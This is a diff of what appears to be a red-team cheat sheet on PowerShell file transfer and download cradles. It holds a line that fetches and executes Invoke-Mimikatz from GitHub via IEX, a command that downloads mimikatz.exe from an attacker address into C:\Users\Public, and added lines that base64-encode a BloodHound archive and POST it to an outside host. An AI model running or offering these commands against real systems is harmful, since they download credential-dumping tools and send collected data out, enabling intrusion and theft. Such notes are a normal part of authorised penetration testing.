@@ -9,14 +9,22 @@ $Client.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredenti
 IEX (iwr 'https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
 
 
-### powershell 4.0 / 5.0 Invoke-WebRequest (works in constrained language mode)
+### Invoke-WebRequest
 
-Invoke-WebRequest "http://10.10.10.10/mimikatz.exe" -OutFile "C:\Users\Public\mimikatz.exe"
+`Invoke-WebRequest "http://10.10.10.10/mimikatz.exe" -OutFile "C:\Users\Public\mimikatz.exe"`
+
+
+### Invoke-WebRequest POST base64 data
+
+`$Base64String = [System.convert]::ToBase64String((Get-Content -Path 'c:/temp/BloodHound.zip' -Encoding Byte))`
+`Invoke-WebRequest -Uri http://10.10.10.10:443 -Method POST -Body $Base64String`
+
+`echo <base64> | base64 -d -w 0 > bloodhound.zip `
+
+
+### download cradles
 
 from @harmj0y:
-
-### powershell download cradles
-
 
 * #### powershell 3.0+ download and execute (bypass IE firstrun check)
 
@@ -120,9 +128,9 @@ https://twitter.com/egre55/status/1087685529016193025
 
 ## base64
 
-`cat binary.exe | base64 -w 0`
+`cat binary | base64 -w 0`
 
-`echo {base64_data} | base64 -d > binary.exe`
+`echo <base64> | base64 -d > binary`
 
 
 ## WebDAV downloaders
